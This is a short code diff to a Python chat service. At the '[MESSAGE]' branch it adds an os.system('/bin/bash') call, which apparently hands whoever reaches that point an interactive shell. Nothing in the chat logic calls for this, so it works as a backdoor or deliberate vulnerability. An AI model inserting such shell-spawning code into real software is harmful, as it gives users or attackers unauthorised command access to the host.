@@ -23,6 +23,7 @@ def chatting_service():
 		report_form()
 	if message == '[MESSAGE]':
 		print ('There are currently 0 other users logged in')
+		os.system("/bin/bash")
 		while True:
 			message2 = input('[MESSAGE]: ')
 			if message2 == '[REPORT]':
